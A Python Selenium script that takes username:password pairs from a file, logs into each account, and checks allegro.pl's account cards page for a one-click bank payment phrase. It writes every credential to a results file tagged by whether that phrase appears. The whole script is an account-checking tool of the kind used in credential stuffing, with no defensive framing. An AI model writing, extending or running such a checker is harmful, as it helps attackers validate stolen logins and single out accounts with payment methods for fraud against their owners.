# -*- coding: UTF-8 -*-

from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time
import random
from datetime import date, datetime, timedelta

# Please here set the three words to search
search_string = 'bankowym jednym kliknięciem'


def checker(usr, pwd, search_string):

    browser = webdriver.Firefox()

    browser.get('auth')
    elem_name = browser.find_element_by_name('username')  # Find the input box
    elem_name.send_keys(usr)
    elem_pwd = browser.find_element_by_name('password')  # Find the input box
    elem_pwd.send_keys(pwd + Keys.RETURN)
    time.sleep(2)

    browser.get('http://allegro.pl/myaccount/cards.php')

    elem = browser.find_element_by_xpath("//*")
    source_code = elem.get_attribute("outerHTML")

    encostr = unicode(search_string, encoding='utf-8')
    list = []
    if source_code.find(encostr) > 1:
        # if random.randint(1, 2) == 1:
        list.append(usr+','+pwd+',(C)\n')
    else:
        list.append(usr+','+pwd+',(S)\n')

    return list

f = open('ll_login.txt', 'rb')
fw = open('ll_result.txt', 'r+')
fw.write('user:password,status\n')

fread = f.readlines()
res = []
for i in fread:
    pwd = i.split(':')[1].replace('\n', '')
    user = i.split(':')[0]
    list_data = checker(user, pwd, search_string)
    res.append(list_data[0])

fw.writelines(res)